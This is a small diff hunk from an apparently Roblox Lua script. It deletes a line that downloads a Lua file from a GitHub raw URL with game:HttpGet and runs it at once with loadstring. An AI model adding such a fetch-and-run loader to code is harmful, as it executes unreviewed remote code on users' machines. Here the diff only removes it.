@@ -1272,5 +1272,3 @@ pcall(function()
     local TrakuPas = coroutine.wrap(TrakuSpawn)   
     TrakuPas()
 end)
-
-loadstring(game:HttpGet('https://raw.githubusercontent.com/PenguinManiack/Crucifix/main/Crucifix.lua'))()
